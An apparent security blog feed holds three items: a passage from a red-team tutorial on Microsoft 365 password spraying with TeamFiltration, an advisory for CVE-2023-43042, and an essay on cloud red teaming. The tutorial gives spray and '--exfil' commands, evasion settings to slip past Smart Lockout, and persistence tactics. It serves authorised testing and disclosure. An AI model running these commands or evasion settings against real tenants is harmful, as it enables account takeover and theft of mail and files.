&lt;li&gt;AWS access and secret keys to the API gateway IAM account previously described.&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;Using Teams to enumerate users is approach the author recommended, but there are other available methods, such as the &lt;code&gt;--validate-msol&lt;/code&gt; option which uses the GetCredentialType method and is slower. A nuance we found during our testing was that some accounts (for example, service accounts) indeed do not have a Teams license but would instead only show up on &lt;code&gt;--validate-msol&lt;/code&gt;. On the other hand &lt;code&gt;--validate-login&lt;/code&gt; triggers logins to check, is extremely loud and is not recommended.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;For all the other profile options, you can just copy from the Github repo&amp;rsquo;s template. &amp;ldquo;Proxy&amp;rdquo; here refers to a local/remote web proxy for debugging purposes only, for example 127.0.0.1:8080 shown here is the one commonly used by BurpSuite. It is completely optional.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;{
     &amp;#34;pushoverAppKey&amp;#34;: &amp;#34;&amp;#34;,
     &amp;#34;pushoverUserKey&amp;#34;: &amp;#34;&amp;#34;,
     &amp;#34;dehashedEmail&amp;#34; : &amp;#34;&amp;#34;,
     &amp;#34;dehashedApiKey&amp;#34;: &amp;#34;&amp;#34;,
     &amp;#34;sacrificialO365Username&amp;#34;: &amp;#34;tfsacrificialuser1@domain.org&amp;#34;,
      &amp;#34;sacrificialO365Passwords&amp;#34;: &amp;#34;RANDOM123&amp;#34; , 
      &amp;#34;proxyEndpoint&amp;#34;: &amp;#34;http://127.0.0.1:8080&amp;#34;,
      &amp;#34;AWSAccessKey&amp;#34;: &amp;#34;CHANGEME&amp;#34;,
      &amp;#34;AWSSecretKey&amp;#34;: &amp;#34;CHANGEME&amp;#34;,
      &amp;#34;UserAgent&amp;#34;: &amp;#34;Mozilla/5.0 (Windows NT 10.0; Win64; x64)...&amp;#34;,
      &amp;#34;AwsRegions&amp;#34;:[&amp;#34;us-east-1&amp;#34;, &amp;#34;us-west-1&amp;#34;, &amp;#34;us-west-2&amp;#34;, &amp;#34;ca-central-1&amp;#34;,...]
}&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h3&gt;User Enumeration&lt;span class=&#34;absolute -mt-20&#34; id=&#34;user-enumeration&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#user-enumeration&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Refer to Flangvik&amp;rsquo;s video on nuances in enumerating users with Teamfiltration, but the base options with &lt;code&gt;--validate-teams&lt;/code&gt; worked well for us:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;~/tools/TeamFiltration --config ./TFconfig_client.json --enum --usernames ./names.txt --validate-teams --outpath ./TF&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;code&gt;--outpath ~/clientA/TF&lt;/code&gt; - this means the results of the enumeration is saved in a database file in the stated path, which the subsequent steps would use.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic5.png&#34; title=&#34;pic5&#34; alt=&#34;pic5&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic5&lt;/figcaption&gt;
  &lt;/figure&gt; User enum in action on an engagement.&lt;/p&gt;
&lt;h3&gt;Password Spraying&lt;span class=&#34;absolute -mt-20&#34; id=&#34;password-spraying&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#password-spraying&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;~/tools/TeamFiltration --config ./TFconfig.json --outpath ./TF --spray --sleep-min 75 --sleep-max 90 --jitter 10 --shuffle-users --shuffle-regions --exclude exclude.txt --common-only&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic6.png&#34; title=&#34;pic6&#34; alt=&#34;pic6&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic6&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;As previously explained, our goal is to not trigger Smart Lockout so that a correct credential set would get us either &amp;ldquo;Access Granted&amp;rdquo; or &amp;ldquo;MFA required&amp;rdquo; returns messages, instead of the &lt;code&gt;AADESTS50053 idslocked&lt;/code&gt; error message. What has been found to work for us are these settings:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--shuffle-regions&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;This seemed to be the most important, as you can see TF creates roughly 10 Fireprox endpoints in the regions you defined in the TF profile. By shuffling regions, each request comes from a different AWS georegion and the sequence is also shuffled. &lt;code&gt;--shuffle users&lt;/code&gt; is to change the sequence of users being sprayed. It did not seem to affect detection but I like to keep it on too.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--sleep-min&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;and &lt;code&gt;--sleep-max&lt;/code&gt;: It is also critical to space out your spraying rounds as this defines the min/max time interval (in minutes) between which each user is attempted again. The time is randomised a bit between the 2 values to not look regular to MS. Somewhere around 1 hour per round worked for us.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--jitter&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;it defines the time (in seconds) within one round, between trying a password against any 2 users. Against there is some randomised variability to not look like a bot to MS.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--exclude&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;AADESTS50053 idslocked&lt;/code&gt; error message is something expected to appear in a small % of users (up to 5 or even 10%), even in the first spraying round. You can try to exclude these users in subsequent rounds, or not. Sometimes &lt;code&gt;AADESTS50053&lt;/code&gt; locked user(s) are observed to unlock on subsequent rounds so it&amp;rsquo;s not the end of the world as long as the % remains small and the client is in the loop of your actions.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;--common-only&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Tries the &amp;ldquo;commonly observed&amp;rdquo; passwords the author defined in the source code. Of course you can use your own but these are quite good actually.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let&amp;rsquo;s say your spraying went well and you found valid credentials, then you would be given the choice by the tool to either &lt;code&gt;--exfil&lt;/code&gt; to loot right away, or do it later. I would recommend to do it right away, unless there is a compelling reason not to.&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;
    &lt;img src=&#34;images/pic7.png&#34; title=&#34;pic7&#34; alt=&#34;pic7&#34; loading=&#34;lazy&#34; /&gt;
    &lt;figcaption&gt;pic7&lt;/figcaption&gt;
  &lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;You can also see all the valid credentials you found in prior spraying in the tool.&lt;/p&gt;
&lt;h3&gt;Wait, what about MFA?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;wait-what-about-mfa&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#wait-what-about-mfa&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;One reason why password spraying is performed less commonly by security testers against M365 might be the prevalence of multi-factor authentication (MFA), particularly in more mature or regulated clients. At least that was my assumption when learning about all these approaches.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;I thought, why password spray an MFA-enabled client? At worst you&amp;rsquo;re going to alert the defenders and at best you can prove that MFA was working as intended to protect people who had weak passwords.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Such was my assumption. What I learned later was that implementing MFA in M365 was not as simple as flipping a switch. Often times, accounts can have missing MFA requirements, for any number of reasons:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Application / service accounts that does not support MFA usage.&lt;/li&gt;
&lt;li&gt;New starter who have not gotten their company device to set up MFA on, or&lt;/li&gt;
&lt;li&gt;Leaver accounts not deactivated, from a time when the org haven&amp;rsquo;t implemented MFA yet.&lt;/li&gt;
&lt;li&gt;Legacy applications using M365 OAuth that the business needs, but does not support MFA.&lt;/li&gt;
&lt;li&gt;and so on.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;So after you have found a set of valid credentials on Teamfiltration (congrats btw), you can either interactively choose to &lt;code&gt;exfil&lt;/code&gt; immediately or hit &lt;code&gt;--exfil&lt;/code&gt; later to loot. What TF then does is to enumerate all the known platforms and applications with those credentials and see if there are any holes in the MFA implementation.&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;~/tools/TeamFiltration --config ./TFconfig.json --outpath ./TF --exfil --all --roadtools ./TF/.roadtools_auth&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;For example, the tool would try trying:&lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;Windows PC - MS Teams - invalid
Mac - MS Teams - invalid
iPhone - MS Teams - invalid
Android - MS Teams - invalid
...
Windows PC - Outlook - invalid
Mac - Outlook - MFA Hole found!
...&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;When a hole is discovered, the tool goes in, grabs the relevant access and refresh tokens that can possibly be obtained, and then exfiltrates emails, Teams chat log, Sharepoint files and so on. You could also export the tokens to be used in other tools like Roadtools or GraphRunner.&lt;/p&gt;
&lt;p&gt;Tools such as &lt;a href=&#34;https://github.com/dafthack/MFASweep&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;MFASweep&lt;/a&gt; does a very similar MFA enumeration to look for an implementation gap, given valid set(s) credentials, for various Microsoft services and platoform combinations.&lt;/p&gt;
&lt;h3&gt;Opsec Concerns &amp;amp; Post Exploitation&lt;span class=&#34;absolute -mt-20&#34; id=&#34;opsec-concerns--post-exploitation&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#opsec-concerns--post-exploitation&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Being stealthy is crucial for many of us red teamers, so it is reasonable to ask the question of, how loud is sending thousands of login request to a single M365 tenant? The good (and bad) news is, as of 2024, spraying low and slow (as described above) can get past Entra Smart Lockout, and even if there are a couple of &lt;code&gt;AADESTS50053 idslocked&lt;/code&gt; errors along the way, the attack itself does not produce a &amp;ldquo;singular&amp;rdquo; &lt;em&gt;We are under attack from a password spray&lt;/em&gt; alert under either MS&amp;rsquo;s Entra ID protection or Defender for M356 by default. The repeated login attempts do appear in the logs if blue team is looking for it, but before you find any valid credentials, you should still be under the radar unless the client has custom detection rules (perhaps, &amp;gt;1k per day failed login attempts for the whole organisation?).&lt;/p&gt;
&lt;p&gt;The second point is more open for discussion, even if the defenders figured out they are under some sort of distributed password spraying attack geolocated around the world, while this might heighten the alertness of the team, there seem to be little that can be done at the moment. A caveat is that as Microsoft themselves were compromised by a distributed password spraying attack, I would not be surprised if they do something soon-ish, but we shall see.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Quoting Nikhil Mittal, a renowned voice in our community, &amp;ldquo;the loudest action you can perform with Azure or M365 in general, is authentication.&amp;rdquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;Where you could quite reliably get an alert is when a set of valid credentials are found are used authenticate to perform the post-exploitation steps. So far, the only activity that can be used to verify credentials is using them to login, so the notification on our tooling that &amp;ldquo;valid creds are found&amp;rdquo; should also be treated as alert T+0.&lt;/p&gt;
&lt;p&gt;That is the reason why I recommended running the &lt;code&gt;--exfil&lt;/code&gt;, or performing other post-exploitation actions as soon as you find any set of valid credentials. If the blue team caught on and got the user to reset their password, your hard work so far would have been for naught. On the other hand, our experience with Teamfiltration so far has been that, it takes typically minutes to download thousands of business emails, Team chat logs and hundreds of MiBs of Sharepoint data, so it is definitely worthwhile to do that first for proving impact upfront.&lt;/p&gt;
&lt;h4&gt;Do you have a game plan?&lt;span class=&#34;absolute -mt-20&#34; id=&#34;do-you-have-a-game-plan&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#do-you-have-a-game-plan&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Another generic recommendation is to have a generic post-exploitation plan before starting the password spray. It can any of the below:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Prepared internal phishing email &amp;amp; payload that you can hit send right away.&lt;/li&gt;
&lt;li&gt;Token-craft - figure out what post-ex tools need what sort of access and/or refresh tokens, and how to get &amp;amp; use them.&lt;/li&gt;
&lt;li&gt;Organisational Persistence with inviting your own M365 users into the client&amp;rsquo;s org as guests, and registering your malicious Enterprise application to retain access even if the compromised user&amp;rsquo;s been burned. GraphRunner is an incredible post-exploitation toolkit for these.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Final word&lt;span class=&#34;absolute -mt-20&#34; id=&#34;final-word&#34;&gt;&lt;/span&gt;
    &lt;a href=&#34;#final-word&#34; class=&#34;subheading-anchor&#34; aria-label=&#34;Permalink for this section&#34;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;All in all, distributed and low-volume password spraying, paired with MFA gap bruteforcing, is a valid and powerful approach for M365 initial access. While it is not expected to get you in for 100% of your clients engagements (For example, some clients have few users, and implement air-tight MFA on all of them. In those cases, social engineering would be a better bet), the approach described would be a valuable addition to most red team&amp;rsquo;s toolkit, especially if the bad guys are using it effectively already.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>&lt;strong&gt;Advisory CVE-2023-43042 – IBM Backup Products Superuser Information Disclosure&lt;/strong&gt;</title>
      <link>//localhost:1313/articles/2023/12/2023-12-21-advisory-cve-2023-43042-ibm-backup-products-superuser-information-disclosure/</link>
      <pubDate>Thu, 21 Dec 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/12/2023-12-21-advisory-cve-2023-43042-ibm-backup-products-superuser-information-disclosure/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Software:&lt;/strong&gt; IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Affected versions:&lt;/strong&gt; 8.3&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Vendor page:&lt;/strong&gt; &lt;a href=&#34;https://www.ibm.com/support/pages/node/7064976&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;https://www.ibm.com/support/pages/node/7064976&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVE Reference:&lt;/strong&gt; CVE-2023-43042&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Published:&lt;/strong&gt; 08/12/2023&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CVSS 3.0 Score:&lt;/strong&gt; 7.5 AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Attack Vector:&lt;/strong&gt; Network&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Credit:&lt;/strong&gt; Max Corbridge&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Summary&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;JUMPSEC’s Head of Adversarial Simulation (&lt;a href=&#34;https://twitter.com/CorbridgeMax&#34; target=&#34;_blank&#34; rel=&#34;noopener&#34;&gt;@CorbridgeMax&lt;/a&gt;) discovered that an unauthenticated user can determine whether the default superuser password has been changed on IBM SAN Volume Controller, IBM Storwize, IBM FlashSystem and IBM Storage Virtualize products. These products were found to be a single point of failure for backup and disaster recovery processes within client environments, and as such are highly critical systems. &lt;/p&gt;
&lt;p&gt;This only affects the 8.3.1 release as it is impossible for the default password to still be configured on an active system running later releases, since the user must change this either as part of first time setup or prior to upgrading from 8.3.1 or earlier. However, IBM has removed the ability to query this status from all releases listed in the Mitigation section of this advisory.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Technical details&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;IBM web servers related to backup/storage products respond to unauthenticated GET requests to the &lt;em&gt;/login&lt;/em&gt; page with the name of the superuser account and if the default password has been changed or not. This could allow unauthenticated attackers on the network with the necessary information to compromise what is often a business-critical asset, with superuser permissions. &lt;/p&gt;
&lt;div class=&#34;code-block relative mt-6 first:mt-0 group/code&#34;&gt;&lt;pre&gt;&lt;code&gt;HTTP/1.1 200 
Cache-Control: no-cache, no-store, must-revalidate
Strict-Transport-Security: max-age=778000; includeSubDomains
X-FRAME-OPTIONS: SAMEORIGIN
X-XSS-Protection: 1; mode=block
Referrer-Policy: no-referrer-when-downgrade
Pragma: no-cache
X-Content-Type-Options: nosniff
SET-COOKIE: JSESSIONID=[REDACTED];Path=/;Secure;SameSite=Lax
SET-COOKIE: _sync=[REDACTED];Path=/;Secure;SameSite=Strict
SET-COOKIE: _redirect=[REDACTED];Path=/;Secure;SameSite=Strict
SET-COOKIE: _sync=[REDACTED]; HttpOnly; Secure
X-FRAME-OPTIONS: DENY
Cache-Control: post-check=0, pre-check=0
vary: accept-encoding
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Date: Fri, 08 Sep 2023 12:28:27 GMT
Connection: close
Content-Length: 70858



&amp;lt;!DOCTYPE html&amp;gt;

&amp;lt;html&amp;gt;
[SNIPPED_FOR_BREVITY]
&amp;#34;superuserPasswordChanged&amp;#34;:true,&amp;#34;hasEnvironmentals&amp;#34;:true,
[SNIPPED_FOR_BREVITY]
&amp;lt;/body&amp;gt;
&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;div class=&#34;opacity-0 transition group-hover/code:opacity-100 flex gap-1 absolute m-[11px] right-0 top-0&#34;&gt;
    &lt;button
      class=&#34;code-copy-btn group/copybtn transition-all active:opacity-50 bg-primary-700/5 border border-black/5 text-gray-600 hover:text-gray-900 rounded-md p-1.5 dark:bg-primary-300/10 dark:border-white/10 dark:text-gray-400 dark:hover:text-gray-50&#34;
      title=&#34;Copy code&#34;
    &gt;
      &lt;div class=&#34;group-[.copied]/copybtn:hidden copy-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
      &lt;div class=&#34;hidden group-[.copied]/copybtn:block success-icon pointer-events-none h-4 w-4&#34;&gt;&lt;/div&gt;
    &lt;/button&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;blockquote&gt;
&lt;p&gt;Figure 1: HTTP Response from IBM FlashSystem Webserver&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;Mitigation&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;As a priority, change the superuser password if it is still set to the default.&lt;/p&gt;
&lt;p&gt;IBM also recommends that you fix this vulnerability by upgrading affected versions of IBM SAN Volume Controller, IBM Storwize V7000, IBM Storwize V5000 and V5100, IBM Storwize V5000E, IBM Spectrum Virtualize Software, IBM Spectrum Virtualize for Public Cloud, IBM FlashSystem V9000, IBM FlashSystem 9500, IBM FlashSystem 9100 Family, IBM FlashSystem 9200, IBM FlashSystem 7300, IBM FlashSystem 7200, IBM FlashSystem 5200 and IBM FlashSystem 5000 to the following code levels or higher:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.6.2.0&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.6.0.2&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.5.0.10&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.4.0.12&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;8.3.1.10&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Please note that it is necessary to change the superuser password before upgrading from 8.3.1 to 8.4.0 or later, which is the reason why this upgrade remediates the vulnerability.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Timeline&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;08/09/2023: Vulnerability submitted through IBM’s Vulnerability Disclosure Program&lt;/p&gt;
&lt;p&gt;13/12/2023: Vulnerability remediated and public notice created by IBM.&lt;/p&gt;

      </description>
    </item>
    
    <item>
      <title>Red Teaming the Cloud: A Shift in Perspective</title>
      <link>//localhost:1313/articles/2023/12/2023-12-19-red-teaming-the-cloud-a-shift-in-perspective/</link>
      <pubDate>Tue, 19 Dec 2023 00:00:00 +0000</pubDate>
      
      <guid>//localhost:1313/articles/2023/12/2023-12-19-red-teaming-the-cloud-a-shift-in-perspective/</guid>
      <description>
        
        
        &lt;p&gt;&lt;strong&gt;Introduction&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Cloud adoption is exploding, and rightfully so. Businesses are seeing the value of improved agility and efficiency when leveraging public cloud, resulting in 60% of all corporate data globally being stored in the cloud in 2022. As such, securing the cloud is becoming an increasingly important skill for defensive security teams, ergo red teaming the cloud is becoming increasingly important for us offensive security teams too.&lt;/p&gt;
&lt;p&gt;Whilst on-premise red teaming is a rich, documented and well-understood topic, cloud red teaming is still in its infancy. This blog post will highlight some of the biggest differences between on-premise and cloud red teaming, and how red teamers must shift their perspective in the newest security frontier: the cloud. &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Initial Compromise&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;One element that remains the same from on-premise to the cloud is that almost all attack paths start with the initial compromise of ‘something’ in the target environment. In fact, that ‘something’ remains largely unchanged: staff members, externally facing assets and exposed data. The first major difference is the end-goal after having achieved this initial compromise: whilst traditional red teaming would see you introduce malware, such as a C2 implant in most cases, cloud red teaming often focuses on obtaining a target’s access tokens or credentials. &lt;/p&gt;
&lt;p&gt;Access ‘tokens’ in Azure or ‘keys’ in AWS both serve the purpose of allowing remote attackers to begin interacting with the cloud estate via portals or APIs, which is where much of the battle will be fought. Whilst this can indeed be obtained through remote code execution (RCE) on a machine in most cases, there are alternative (usually easier) methods such as google dorking for leaked keys or social engineering targeting authentication flows.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Getting to your goal&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;In traditional on-premise environments, attackers seek to obtain credentials and exploit vulnerabilities to move laterally and escalate privileges within the local network. Lateral movement and privilege escalation often involves techniques like credential dumping, exploiting misconfigurations and taking control of increasingly privileged machines and user accounts. Persistence often involves the deployment of malware and mechanisms to keep them alive. &lt;/p&gt;
&lt;p&gt;In cloud environments, the focus shifts towards the compromise of identities, which means attackers primarily aim to compromise user accounts or service principal identities in the target tenant. Many traditional on-premise attack vectors that rely on local network access are not applicable in cloud red teaming scenarios.&lt;/p&gt;
&lt;p&gt;In this case, privilege escalation and persistence can be achieved by compromising other cloud-based identities and their associated permissions. In our experience, whilst many traditional on-premise attack paths require obtaining ‘superuser’ (namely domain administrator) permissions, this is not as often the case in the cloud. We believe this is due to the complexity of, and thereby lack of familiarity with, cloud-based access control permissions leading to access control gaps arising more often. With vendors rightfully advertising least privilege and zero-trust architectures, roles can be assigned with far more granularity. However, with granularity comes greater complexity and administrators sometimes (often) refrain from diving into the documentation to truly understand the permissions needed, resulting in overly permissive accounts.&lt;/p&gt;
&lt;p&gt;Crucially, one of the biggest differences between on-premise and cloud here is that we are typically looking to abuse default configurations or ‘abuse primitives’, as opposed to finding exploits in the cloud platform. The many reasons why this is the case is beyond the scope of this blog post, but an incredibly interesting topic for discussion. Finally, internal phishing using cloud services is often used to gain elevated privileges and, in our experience, used much more often than in on-premise engagements.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Mining for Data&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Data gathering is crucial and still prevalent in both on-premise and cloud engagements. However, the places and the means change substantially. File storage and database servers that were previously secured behind a corporate firewall may now be left exposed due to misconfigurations, resulting in an accidental reliance on ‘security through obscurity’ for business-critical assets and data. Attackers who have phished the right user account may end up connecting to cloud resources from anywhere in the world. Gone are the days when a VPN connection was necessary to reach critical internal resources, as cloud platforms expose their logins and APIs publicly. With a single authentication to cloud platforms an adversary has a foothold in the target cloud environment and all its offerings.&lt;/p&gt;
&lt;p&gt;In response to the evolving landscape of data storage, exchange and security, new methods for extracting sensitive data are emerging. Attackers are increasingly abusing vendor APIs for reconnaissance purposes, as exemplified by the Microsoft Graph API. Only recently we were made aware of a technique using text-to-speech immersive reading features to retrieve and ‘read out’ credential material you should not have access to! Yet again this shows how common features can be exploited, and underscores the need for heightened vigilance in this space. Additionally, we have seen Artificial Intelligence (AI) being trained on the target’s internal blueprints, documents, email exchanges and instant messaging logs to make informed decisions about potential targets within an organisation, whether they are humans, or machines. This raises concerns about the evolving sophistication of cyberattacks and the need to stay ahead as red teamers.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;The cloud’s shared responsibility model has changed the security landscape, as customers cannot assess the security of the systems hosting their data from the ground-up anymore. In many cases, cloud providers leave them to develop the knowledge required to be able to securely administer cloud services, and by doing so open the door for myriad cloud misconfigurations.&lt;/p&gt;
